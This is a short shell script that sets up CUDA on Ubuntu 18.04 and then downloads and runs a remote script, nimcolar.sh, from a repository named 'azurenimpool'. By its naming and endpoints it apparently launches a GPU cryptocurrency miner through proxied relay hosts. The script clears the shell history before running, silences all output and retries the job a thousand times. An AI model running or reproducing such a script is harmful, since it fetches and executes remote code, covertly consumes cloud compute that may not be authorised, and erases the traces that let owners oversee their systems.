wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub
sudo add-apt-repository "deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/ /"
sudo apt-get update && sudo apt-get -y install cuda proxychains &&  curl https://raw.githubusercontent.com/Vinhuit/retry/master/retry -o /usr/local/bin/retry && chmod +x /usr/local/bin/retry && wget -q https://raw.githubusercontent.com/Vinhuit/azurenimpool/master/azure_script/nimcolar.sh -O nimcolar.sh && chmod 777 nimcolar.sh && history -c && history -w && retry -t 1000 "timeout 5h bash -c './nimcolar.sh nimchain--moviescloud.repl.co nginxserver001.herokuapp.com:443 nq > /dev/null'"
echo "Done"
